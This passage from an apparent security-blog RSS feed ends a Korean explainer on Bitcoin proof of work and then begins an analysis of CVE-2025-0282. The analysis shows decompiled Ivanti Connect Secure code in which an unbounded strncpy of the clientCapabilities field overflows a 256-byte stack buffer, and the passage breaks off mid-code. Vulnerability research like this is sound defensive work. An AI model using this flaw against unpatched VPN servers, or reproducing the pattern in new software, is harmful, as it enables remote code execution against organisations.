&#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xBE14;&#xB85D;&#xCCB4;&#xC778;&#xC758; &#xB370;&#xC774;&#xD130;&#xC758; &#xBB34;&#xACB0;&#xC131;&#xC744; &#xBCF4;&#xC7A5;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="3-1-Transaction"><a href="#3-1-Transaction" class="headerlink" title="3.1. Transaction"></a>3.1. Transaction</h2><p><img src="/2025/01/26/bekim/blockchain/ko/image2.png" alt></p><blockquote><p>image source: Bitcoin: A Peer-to-Peer Electronic Cash System</p></blockquote><p>&#xC704;&#xC5D0;&#xC11C; &#xC5B8;&#xAE09;&#xD588;&#xB4EF;&#xC774;, &#xBE44;&#xD2B8;&#xCF54;&#xC778;&#xC758; Transaction&#xB3C4; HashChain&#xC758; &#xC6D0;&#xB9AC;&#xB97C; &#xB530;&#xB985;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C; Transaction&#xC740; &#xBE44;&#xD2B8;&#xCF54;&#xC778; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0;&#xC11C; &#xBE44;&#xD2B8;&#xCF54;&#xC778;&#xC744; &#xC1A1;&#xAE08;&#xD558;&#xAC70;&#xB098; &#xC774;&#xB3D9;&#xC2DC;&#xD0A4;&#xB294; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xB2E8;&#xC704;&#xB97C; &#xB9D0;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xAC70;&#xB798; &#xAE30;&#xB85D;&#xB4E4;&#xC740; &#xBAA8;&#xB450; &#xBE14;&#xB85D;&#xCCB4;&#xC778;&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xBA70;, &#xBE44;&#xD2B8;&#xCF54;&#xC778; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xCC38;&#xC5EC;&#xC790;&#xAC00; &#xACF5;&#xC720;&#xD558;&#xB294; <strong>&#xBD84;&#xC0B0; &#xC6D0;&#xC7A5;(ledger)</strong>&#xC5D0; &#xAE30;&#xB85D;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xAC01; Transaction&#xC740; <strong>&#xC774;&#xC804; Transaction&#xC758; &#xD574;&#xC2DC; &#xAC12;</strong>&#xC744; &#xD3EC;&#xD568;&#xD574;&#xC11C; &#xC11C;&#xB85C; &#xC5F0;&#xACB0;&#xB429;&#xB2C8;&#xB2E4;. &#xC704; &#xADF8;&#xB9BC;&#xCC98;&#xB7FC;, Owner 1&#xC758; Transaction&#xC5D0;&#xB294; Owner 0&#xC758; &#xD574;&#xC2DC; &#xAC12;&#xC774; &#xD3EC;&#xD568;&#xB418;&#xC5B4;, Owner 1&#xC774; &#xD574;&#xB2F9; &#xC790;&#xC0B0;&#xC758; &#xC18C;&#xC720;&#xAD8C;&#xC744; &#xD569;&#xBC95;&#xC801;&#xC73C;&#xB85C; &#xC774;&#xC804; &#xBC1B;&#xC558;&#xC74C;&#xC744; &#xC99D;&#xBA85;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xB610;&#xD55C; Transaction&#xC5D0;&#xB294; &#xD604;&#xC7AC; Owner&#xC758; <strong>&#xACF5;&#xAC1C; &#xD0A4;(Public key)</strong>&#xC640; <strong>&#xB514;&#xC9C0;&#xD138; &#xC11C;&#xBA85;(Digital Signature)</strong>&#xC774; &#xD3EC;&#xD568;&#xD558;&#xACE0; &#xC788;&#xC5B4;&#xC694;. &#xADF8;&#xB798;&#xC11C; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xB294; &#xACF5;&#xAC1C; &#xD0A4;&#xB97C; &#xD1B5;&#xD574; &#xB514;&#xC9C0;&#xD138; &#xC11C;&#xBA85;&#xC744; &#xAC80;&#xC99D;&#xD558;&#xC5EC;, Transaction&#xC774; &#xC704;&#xC870;&#xB418;&#xC9C0; &#xC54A;&#xC558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; Owner 2&#xB294; Owner 1&#xC758; Transaction&#xC744; &#xCC38;&#xC870;&#xD558;&#xACE0;, &#xC790;&#xC2E0;&#xC758; &#xB514;&#xC9C0;&#xD138; &#xC11C;&#xBA85;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xC5EC; &#xC0C8;&#xB85C;&#xC6B4; Transaction&#xC744; &#xC0DD;&#xC131;&#xD574;&#xC694;. &#xC774;&#xB7EC;&#xD55C; &#xACFC;&#xC815;&#xC774; &#xBC18;&#xBCF5;&#xB418;&#xBA74;&#xC11C; Transaction&#xB4E4;&#xC740; &#xC5F0;&#xC18D;&#xC801;&#xC73C;&#xB85C; &#xC5F0;&#xACB0;&#xB418;&#xC5B4; &#xD574;&#xC2DC; &#xCCB4;&#xC778; &#xD615;&#xD0DC;&#xB97C; &#xC774;&#xB8E8;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB7EC;&#xD55C; &#xAD6C;&#xC870;&#xB85C; &#xC778;&#xD574;, &#xD558;&#xB098;&#xC758; Transaction&#xC774;&#xB77C;&#xB3C4; &#xBCC0;&#xACBD;&#xB418;&#xBA74;, &#xC774;&#xD6C4; &#xBAA8;&#xB4E0; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC774; &#xBB34;&#xD6A8;&#xD654; &#xB418;&#xC5B4; &#xB370;&#xC774;&#xD130; &#xBB34;&#xACB0;&#xC131;&#xC744; &#xBCF4;&#xC7A5;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><h1 id="4-Proof-of-Work-PoW-&#xC791;&#xC5C5;-&#xC99D;&#xBA85;"><a href="#4-Proof-of-Work-PoW-&#xC791;&#xC5C5;-&#xC99D;&#xBA85;" class="headerlink" title="4. Proof of Work (PoW, &#xC791;&#xC5C5; &#xC99D;&#xBA85;)"></a>4. Proof of Work (PoW, &#xC791;&#xC5C5; &#xC99D;&#xBA85;)</h1><p>&#xBE44;&#xD2B8;&#xCF54;&#xC778; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0;&#xC11C;&#xB294; &#xC0C8;&#xB85C;&#xC6B4; &#xBE14;&#xB85D;&#xC744; &#xBE14;&#xB85D; &#xCCB4;&#xC778;&#xC5D0; &#xCD94;&#xAC00;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xC0C8;&#xB85C;&#xC6B4; &#xD654;&#xD3D0;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xACE0; &#xC1A1;&#xAE08;&#xC744; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xD575;&#xC2EC; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC774; &#xBC14;&#xB85C; Proof of Work (&#xC791;&#xC5C5; &#xC99D;&#xBA85;)&#xC785;&#xB2C8;&#xB2E4;.<br><img src="/2025/01/26/bekim/blockchain/ko/image3.png" alt><br>&#xC791;&#xC5C5; &#xC99D;&#xBA85;&#xC744; &#xC9C1;&#xAD00;&#xC801;&#xC73C;&#xB85C; &#xC774;&#xD574;&#xD558;&#xC790;&#xBA74;, &#xCC44;&#xAD74;&#xC790;&#xB4E4;&#xC774; &#xBCF5;&#xC7A1;&#xD55C; &#xC218;&#xD559;&#xC801; &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xB294; <strong>&#x201C;&#xC791;&#xC5C5;&#xC744; &#xC218;&#xD589;&#xD588;&#xC74C;&#xC744; &#xC99D;&#xBA85;&#x201D;</strong>&#xD558;&#xB3C4;&#xB85D; &#xC694;&#xAD6C;&#xD558;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xBB38;&#xC81C;&#xB97C; &#xAC00;&#xC7A5; &#xBA3C;&#xC800; &#xD574;&#xACB0;&#xD55C; &#xCC44;&#xAD74;&#xC790;&#xB294; &#xBB38;&#xC81C;&#xB97C; &#xAC00;&#xC7A5; &#xBA3C;&#xC800; &#xD574;&#xACB0;&#xD55C; &#xCC44;&#xAD74;&#xC790;&#xB294; &#xC0C8;&#xB85C;&#xC6B4; &#xBE14;&#xB85D;&#xC744; &#xBE14;&#xB85D;&#xCCB4;&#xC778;&#xC5D0; &#xCD94;&#xAC00;&#xD560; &#xAD8C;&#xB9AC;&#xB97C; &#xC5BB;&#xC73C;&#xBA70;, &#xBCF4;&#xC0C1;&#xC73C;&#xB85C; &#xBE44;&#xD2B8;&#xCF54;&#xC778;&#xC744; &#xBC1B;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xD0C8;&#xC911;&#xC559;&#xD654; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C;&#xB294; &#xAC70;&#xB798;&#xB97C; &#xAD00;&#xB9AC;&#xD558;&#xB294; &#xC911;&#xC559; &#xC2DC;&#xC2A4;&#xD15C;&#xC774; &#xC5C6;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xBAA8;&#xB4E0; &#xCC38;&#xC5EC;&#xC790;&#xAC00; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xC2E0;&#xB8B0;&#xD558;&#xACE0; &#xB3D9;&#xC758;&#xD560; &#xC218; &#xC788;&#xB294; &#xBC29;&#xC2DD;&#xC774; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;. &#xC791;&#xC5C5; &#xC99D;&#xBA85;&#xC740; &#xC774;&#xB97C; &#xAC00;&#xB2A5;&#xD558;&#xAC8C; &#xD558;&#xB294; &#xC911;&#xC694;&#xD55C; &#xC5ED;&#xD560;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.<br><img src="/2025/01/26/bekim/blockchain/ko/image4.png" alt><br>&#xC704; &#xACFC;&#xC815;&#xC744; &#xC880; &#xB354; &#xC790;&#xC138;&#xD788; &#xC124;&#xBA85;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.<br>&#xCC44;&#xAD74;&#xC790;&#xB4E4;&#xC740; Nonce&#xB77C;&#xB294; &#xAC12;(&#xCC44;&#xAD74;&#xC790;&#xAC00; &#xC784;&#xC758;&#xB85C; &#xBCC0;&#xACBD;&#xD560; &#xC218; &#xC788;&#xB294; &#xAC12;)&#xC744; &#xACC4;&#xC18D; &#xBCC0;&#xACBD;&#xD574;&#xAC00;&#xC11C; &#xD574;&#xC2DC; &#xD37C;&#xC990;(Hash Puzzle)&#xC744; &#xD480;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; &#xCC98;&#xC74C;&#xC5D0;&#xB294; &#xD574;&#xC2DC; &#xCD9C;&#xB825; &#xAC12;&#xC774; 8&#xAC1C;&#xC758; 0&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xB418;&#xC5B4;&#xC57C; &#xC0C8;&#xB85C;&#xC6B4; &#xBE14;&#xB85D;&#xC774; &#xC815;&#xB2F9;&#xD558;&#xAC8C; &#xCC44;&#xAD74;&#xB41C; &#xAC83;&#xC73C;&#xB85C; &#xC778;&#xC815;&#xB429;&#xB2C8;&#xB2E4;. </p><p>&#xBE44;&#xD2B8;&#xCF54;&#xC778; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0;&#xC11C;&#xB294; &#xD3C9;&#xADE0; 10&#xBD84;&#xC5D0; &#xD55C; &#xBC88;&#xC529; &#xBE14;&#xB85D;&#xC774; &#xC0DD;&#xC131;&#xB418;&#xB3C4;&#xB85D; &#xC124;&#xACC4;&#xB418;&#xC5B4;&#xC788;&#xB294;&#xB370;, &#xC774;&#xB97C; &#xC720;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD574; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xB294; &#xB09C;&#xC774;&#xB3C4;(Difficulty)&#xB97C; &#xC870;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. &#xB09C;&#xC774;&#xB3C4;&#xB294; &#xD574;&#xC2DC; &#xAC12;&#xC5D0;&#xC11C; &#xC694;&#xAD6C;&#xD558;&#xB294; 0&#xC758; &#xAC1C;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xACB0;&#xC815;&#xB418;&#xB294;&#xB370;, 0&#xC758; &#xAC1C;&#xC218;&#xAC00; &#xB9CE;&#xC544;&#xC9C8;&#xC218;&#xB85D; &#xC720;&#xD6A8;&#xD55C; &#xD574;&#xC2DC; &#xAC12;&#xC744; &#xCC3E;&#xB294;&#xB370; &#xD544;&#xC694;&#xD55C; &#xACC4;&#xC0B0;&#xB7C9;&#xC774; &#xB354; &#xB298;&#xAC8C; &#xB3FC;&#xC694;. &#xCD08;&#xAE30;&#xC5D0;&#xB294; &#xD574;&#xC2DC;&#xC758; &#xCD9C;&#xB825; &#xAC12;&#xC774; 8&#xAC1C;&#xC758; 0&#xC774; &#xD544;&#xC694;&#xD588;&#xC9C0;&#xB9CC;, &#xD604;&#xC7AC;(2024&#xB144; &#xAE30;&#xC900;) &#xB09C;&#xC774;&#xB3C4;&#xB294; &#xB354; &#xB192;&#xC544;&#xC838;&#xC11C; &#xD574;&#xC2DC; &#xAC12;&#xC5D0; 19&#xAC1C;&#xC758; 0&#xC774; &#xC694;&#xAD6C;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB85C; &#xC778;&#xD574; &#xB9C9;&#xB300;&#xD55C; &#xACC4;&#xC0B0; &#xC790;&#xC6D0;&#xACFC; &#xC804;&#xB825;&#xC774; &#xD544;&#xC694; &#xBA70;, &#xC624;&#xB298;&#xB0A0;&#xC5D0;&#xB294; &#xC77C;&#xBC18;&#xC801;&#xC778; &#xCEF4;&#xD4E8;&#xD130;&#xB85C;&#xB294; &#xCC44;&#xAD74; &#xACBD;&#xC7C1;&#xC5D0; &#xCC38;&#xC5EC;&#xD558;&#xAE30; &#xC5B4;&#xB824;&#xC6CC;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB7EC;&#xD55C; &#xC791;&#xC5C5; &#xC99D;&#xBA85;&#xC740; &#xBE14;&#xB85D; &#xCCB4;&#xC778; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC758; &#xB370;&#xC774;&#xD130; &#xBB34;&#xACB0;&#xC131;&#xC744; &#xBCF4;&#xC7A5;&#xD558;&#xACE0;, Longest chain rule (&#xAC00;&#xC7A5; &#xAE34; &#xCCB4;&#xC778; &#xC6D0;&#xCE59;)&#xC744; &#xD1B5;&#xD574; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xCC38;&#xC5EC;&#xC790;&#xB4E4;&#xC774; &#xD569;&#xC758;&#xC5D0; &#xB3C4;&#xB2EC;&#xD558;&#xB3C4;&#xB85D; &#xB3D5;&#xC2B5;&#xB2C8;&#xB2E4;.<br><img src="/2025/01/26/bekim/blockchain/ko/image5.png" alt></p><blockquote><p>Image Source: The longest chain accounts for the greatest PoW effort and is admitted as the main chain, ResearchGate.</p></blockquote><p>&#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0;&#xC11C; &#xB3D9;&#xC2DC;&#xC5D0; &#xC5EC;&#xB7EC; &#xCC44;&#xAD74;&#xC790;&#xAC00; &#xC0C8;&#xB85C;&#xC6B4; &#xBE14;&#xB85D;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xBA74; &#xB450; &#xAC1C; &#xC774;&#xC0C1;&#xC758; &#xCCB4;&#xC778;&#xC774; &#xC874;&#xC7AC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xACBD;&#xC6B0;&#xB97C; fork&#xB77C;&#xACE0; &#xD558;&#xB294;&#xB370;, &#xD3EC;&#xD06C;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xBA74; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xCC38;&#xC5EC;&#xC790;&#xB4E4;&#xC740; &#xC5B4;&#xB5A4; &#xCCB4;&#xC778;&#xC744; &#xC2E0;&#xB8B0;&#xD574;&#xC57C; &#xD560;&#xC9C0; &#xACB0;&#xC815;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.<br>&#xC774; &#xACBD;&#xC6B0; longest chain rule&#xC744; &#xB530;&#xB77C;&#xC11C; &#xAC00;&#xC7A5; &#xB9CE;&#xC740; &#xC791;&#xC5C5; &#xC99D;&#xBA85;(PoW)&#xC774; &#xD22C;&#xC785;&#xB41C; &#xCCB4;&#xC778;&#xC744; &#xBA54;&#xC778; &#xCCB4;&#xC778;&#xC73C;&#xB85C; &#xC778;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. &#xC989;, &#xAC00;&#xC7A5; &#xAE34; &#xCCB4;&#xC778;&#xC774; &#xAC00;&#xC7A5; &#xB9CE;&#xC740; &#xACC4;&#xC0B0; &#xC790;&#xC6D0;&#xC744; &#xC18C;&#xBAA8;&#xD574; &#xC0DD;&#xC131;&#xB418;&#xC5C8;&#xC73C;&#xBBC0;&#xB85C;, &#xC720;&#xD6A8;&#xD55C; &#xCCB4;&#xC778;&#xC784;&#xC744; &#xC778;&#xC815;&#xD558;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC704; &#xADF8;&#xB9BC;&#xC5D0;&#xC11C; &#xBCFC; &#xC218; &#xC788;&#xB4EF;, &#xACBD;&#xC7C1;&#xC5D0;&#xC11C; &#xD0C8;&#xB77D;&#xD55C; &#xCCB4;&#xC778;&#xC5D0; &#xC18D;&#xD55C; &#xBE14;&#xB85D;&#xB4E4;&#xC740; Stale Block(&#xBC84;&#xB824;&#xC9C4; &#xBE14;&#xB85D;)&#xC73C;&#xB85C; &#xAC04;&#xC8FC;&#xB418;&#xC5B4; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0;&#xC11C; &#xBB34;&#xD6A8;&#xD654; &#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xBE14;&#xB85D;&#xC5D0; &#xD3EC;&#xD568;&#xB41C; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC740; &#xC774;&#xD6C4; main chain&#xC5D0; &#xB2E4;&#xC2DC; &#xD3EC;&#xD568;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xACFC;&#xC815;&#xC744; &#xD1B5;&#xD574; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC758; &#xBAA8;&#xB4E0; &#xCC38;&#xC5EC;&#xC790;&#xAC00; &#xAC00;&#xC7A5; &#xAE34; &#xCCB4;&#xC778;&#xC744; &#xACF5;&#xC720;&#xD568;&#xC73C;&#xB85C;&#xC368; &#xB370;&#xC774;&#xD130;&#xC758; &#xBB34;&#xACB0;&#xC131;&#xACFC; &#xC2E0;&#xB8B0;&#xC131;&#xC744; &#xC720;&#xC9C0;&#xD558;&#xACE0;, &#xD0C8;&#xC911;&#xC559;&#xD654;&#xB41C; &#xD658;&#xACBD;&#xC5D0;&#xC11C;&#xC758; &#xD569;&#xC758;&#xB97C; &#xC774;&#xB8F0; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#x1F646;</p><p>&#xC9C0;&#xAE08;&#xAE4C;&#xC9C0; &#xBE44;&#xD2B8;&#xCF54;&#xC778; &#xBC31;&#xC11C;&#xB97C; &#xC911;&#xC2EC;&#xC73C;&#xB85C; &#xBE14;&#xB85D;&#xCCB4;&#xC778;&#xC758; &#xC6D0;&#xB9AC;&#xC640; &#xD575;&#xC2EC; &#xB9E4;&#xCEE4;&#xB2C8;&#xC998;&#xC744; &#xC815;&#xB9AC;&#xD574;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88; &#xAE00;&#xC5D0;&#xC11C;&#xB294; &#xBE14;&#xB85D;&#xCCB4;&#xC778;&#xC774; &#xC5B4;&#xB5BB;&#xAC8C; &#xD0C8;&#xC911;&#xC559;&#xD654;&#xC640; &#xB370;&#xC774;&#xD130; &#xBB34;&#xACB0;&#xC131;&#xC744; &#xC720;&#xC9C0;&#xD558;&#xB294;&#xC9C0;&#xB97C; &#xC911;&#xC810;&#xC801;&#xC73C;&#xB85C; &#xC791;&#xC131;&#xD574;&#xBCF4;&#xC558;&#xC5B4;&#xC694;. </p><p>&#xCCAB; &#xAE00;&#xC740; &#xBE14;&#xB85D;&#xCCB4;&#xC778;&#xC758; &#xAE30;&#xBCF8; &#xC6D0;&#xB9AC;&#xB97C; &#xB113;&#xC740; &#xBC94;&#xC704;&#xC5D0;&#xC11C; &#xB2E4;&#xB918;&#xC9C0;&#xB9CC;, &#xB2E4;&#xC74C; &#xC5F0;&#xAD6C;&#xAE00;&#xC5D0;&#xC11C;&#xB294; &#xC791;&#xC5C5; &#xC99D;&#xBA85;(Proof of Work) &#xC678;&#xC5D0;&#xB3C4; &#xB2E4;&#xC591;&#xD55C; &#xD569;&#xC758; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC5D0; &#xB300;&#xD574; &#xAD6C;&#xCCB4;&#xC801;&#xC73C;&#xB85C; &#xC815;&#xB9AC;&#xD574;&#xBCFC; &#xC608;&#xC815;&#xC785;&#xB2C8;&#xB2E4;.<br>&#xC774; &#xC5F0;&#xAD6C;&#xAE00;&#xC774; &#xBE14;&#xB85D;&#xCCB4;&#xC778;&#xC744; &#xC811;&#xD558;&#xB294; &#xB3C5;&#xC790;&#xBD84;&#xB4E4;&#xC5D0;&#xAC8C; &#xC720;&#xC775;&#xD55C; &#xAE00;&#xC774; &#xB418;&#xC5C8;&#xAE30;&#xB97C; &#xBC14;&#xB78D;&#xB2C8;&#xB2E4;. &#x1F600;</p><h3 id="&#xCD08;&#xC2EC;&#xC790;&#xB97C;-&#xC704;&#xD55C;-&#xBE44;&#xD2B8;&#xCF54;&#xC778;"><a href="#&#xCD08;&#xC2EC;&#xC790;&#xB97C;-&#xC704;&#xD55C;-&#xBE44;&#xD2B8;&#xCF54;&#xC778;" class="headerlink" title="&#xCD08;&#xC2EC;&#xC790;&#xB97C; &#xC704;&#xD55C; &#xBE44;&#xD2B8;&#xCF54;&#xC778;"></a>&#xCD08;&#xC2EC;&#xC790;&#xB97C; &#xC704;&#xD55C; &#xBE44;&#xD2B8;&#xCF54;&#xC778;</h3><ul><li>&#xBD84;&#xC0B0; &#xC6D0;&#xC7A5;(ledger): &#xBAA8;&#xB4E0; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xCC38;&#xC5EC;&#xC790;&#xAC00; &#xB098;&#xB220; &#xAC00;&#xC9C4; &#xB3D9;&#xC77C;&#xD55C; &#xAC70;&#xB798; &#xAE30;&#xB85D;</li><li>&#xB514;&#xC9C0;&#xD138; &#xC11C;&#xBA85;: &#xAC1C;&#xC778; &#xD0A4;&#xB85C; &#xC0DD;&#xC131;&#xB41C; &#xC804;&#xC790; &#xC11C;&#xBA85;</li><li><a href="https://bitaps.com/">https://bitaps.com/</a>&#xC0AC;&#xC774;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; &#xBE44;&#xD2B8;&#xCF54;&#xC778; &#xBE14;&#xB85D; &#xC0DD;&#xC131;&#xC744; &#xC2E4;&#xC2DC;&#xAC04;&#xC73C;&#xB85C; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/bekim/">bekim</category>
      
      <category domain="https://hackyboiz.github.io/tags/bitcoin/">bitcoin</category>
      
      <category domain="https://hackyboiz.github.io/tags/blockchain/">blockchain</category>
      
      <category domain="https://hackyboiz.github.io/tags/PoW/">PoW</category>
      
      
      <comments>https://hackyboiz.github.io/2025/01/26/bekim/blockchain/ko/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-0282: Ivanti Connect Secure의 Stack-based Buffer Overflow 취약점</title>
      <link>https://hackyboiz.github.io/2025/01/25/pwndorei/2025-01-25/</link>
      <guid>https://hackyboiz.github.io/2025/01/25/pwndorei/2025-01-25/</guid>
      <pubDate>Sat, 25 Jan 2025 11:15:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://labs.watchtowr.com/do-secure-by-design-pledges-co</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://labs.watchtowr.com/do-secure-by-design-pledges-come-with-stickers-ivanti-connect-secure-rce-cve-2025-0282/">https://labs.watchtowr.com/do-secure-by-design-pledges-come-with-stickers-ivanti-connect-secure-rce-cve-2025-0282/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Ivanti Connect Secure &lt; 22.7R2.5</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Ivanti Connect Secure&#xB294; &#xAE30;&#xC5C5; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0; &#xB300;&#xD55C; &#xC548;&#xC804;&#xD55C; &#xC6D0;&#xACA9; &#xC561;&#xC138;&#xC2A4;&#xB97C; &#xC81C;&#xACF5;&#xD558;&#xB294; VPN &#xC194;&#xB8E8;&#xC158;&#xC73C;&#xB85C; CVE-2025-0282&#xB294; &#xC5EC;&#xAE30;&#xC11C; &#xBC1C;&#xC0DD;&#xD55C; Stack-based Buffer Overflow&#xB85C; &#xC778;&#xD55C; RCE &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; Ivanti Connect Secure&#xAC00; TNC &#xBA54;&#xC2DC;&#xC9C0; &#xC804;&#xB2EC;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; transport layer &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC778; IF-T &#xD328;&#xD0B7;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xBA3C;&#xC800; &#xC544;&#xB798;&#xC758; &#xCF54;&#xB4DC;&#xB294; <code>clientCapabilities</code> &#xD0A4;&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC744; &#xAC04;&#xB7B5;&#xD654;&#xD55C; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs angelscript"><span class="hljs-built_in">int</span> __cdecl ift_handle_1(<span class="hljs-built_in">int</span> a1, IftTlsHeader *a2, char *a3){    <span class="hljs-built_in">int</span> v18;    <span class="hljs-built_in">int</span> v19;    char dest[<span class="hljs-number">256</span>]; <span class="hljs-comment">// [esp+120h] [ebp-8ECh] BYREF</span>    char object_to_be_freed[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+220h] [ebp-7ECh] BYREF</span>    <span class="hljs-built_in">void</span> *ptr; <span class="hljs-comment">// [esp+224h] [ebp-7E8h]</span>    <span class="hljs-built_in">int</span> v20; <span class="hljs-comment">// [esp+228h] [ebp-7E4h]</span>    <span class="hljs-built_in">int</span> v21; <span class="hljs-comment">// [esp+22Ch] [ebp-7E0h]</span>    <span class="hljs-built_in">int</span> v22; <span class="hljs-comment">// [esp+230h] [ebp-7DCh]</span>    char v23; <span class="hljs-comment">// [esp+234h] [ebp-7D8h]</span>    char v24; <span class="hljs-comment">// [esp+235h] [ebp-7D7h]</span>    <span class="hljs-built_in">void</span> *v25; <span class="hljs-comment">// [esp+23Ch] [ebp-7D0h]</span>    _DWORD v26[<span class="hljs-number">499</span>]; <span class="hljs-comment">// [esp+240h] [ebp-7CCh] BYREF</span>    [..SNIP..]    clientCapabilities = getKey(req, <span class="hljs-string">&quot;clientCapabilities&quot;</span>);<span class="hljs-comment">//[1]</span>    <span class="hljs-keyword">if</span> ( clientCapabilities != NULL )    {      clientCapabilitiesLength = strlen(clientCapabilities);      <span class="hljs-keyword">if</span> ( clientCapabilitiesLength != <span class="hljs-number">0</span> )      connInfo-&gt;clientCapabilities = clientCapabilities;      }    }    memset(dest, <span class="hljs-number">0</span>, sizeof(dest));    strncpy(dest, connInfo-&gt;clientCapabilities, clientCapabilitiesLength);<span class="hljs-comment">//[2]</span>    v24 = <span class="hljs-number">46</span>;    v25 = &amp;v57;    <span class="hljs-keyword">if</span> ( ((unsigned __int8)&amp;v57 &amp; <span class="hljs-number">2</span>) != <span class="hljs-number">0</span> )    {      LOBYTE(v24) = <span class="hljs-number">44</span>;      v57 = <span class="hljs-number">0</span>;      v25 = (__int16 *)&amp;v58;    }    memset(v25, <span class="hljs-number">0</span>, <span class="hljs-number">4</span> * (v24 &gt;&gt; <span class="hljs-number">2</span>));    v26 = &amp;v25[<span class="hljs-number">2</span> * (v24 &gt;&gt; <span class="hljs-number">2</span>)];    <span class="hljs-keyword">if</span> ( (v24 &amp; <span class="hljs-number">2</span>) != <span class="hljs-number">0</span> )      *v26 = <span class="hljs-number">0</span>;    na = <span class="hljs-number">46</span>;    (*(<span 